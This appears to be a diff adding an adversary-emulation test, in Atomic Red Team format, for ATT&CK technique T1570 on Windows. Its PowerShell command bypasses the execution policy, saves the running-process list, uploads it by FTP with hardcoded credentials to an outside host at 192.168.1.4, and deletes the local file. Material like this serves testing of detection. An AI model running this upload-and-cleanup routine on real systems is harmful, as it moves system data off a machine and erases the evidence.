@@ -1,0 +1,26 @@
+attack_technique: T1570
+display_name: T1570 test
+atomic_tests:
+- name: T1570 test
+  auto_generated_guid: 4249a444-ce71-4b34-9b7b-d16705c0768f
+  description: |-
+    test
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      $ftpuri = "ftp://root:toor@192.168.1.4/"	
+            
+      $MK_FILENAME = "info.txt"
+      Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
+      $upfilepath = $env:PUBLIC  + '\' + $MK_FILENAME
+      Get-process >> $upfilepath
+      Start-Sleep -s 1
+            
+      $webclient = New-Object System.Net.WebClient
+      $uri = New-Object System.Uri($ftpuri + [IO.Path]::GetFileName($upfilepath))
+      $webclient.UploadFile($uri, $upfilepath)
+      Remove-Item $upfilepath -Force
+    name: powershell
+    elevation_required: true
+  
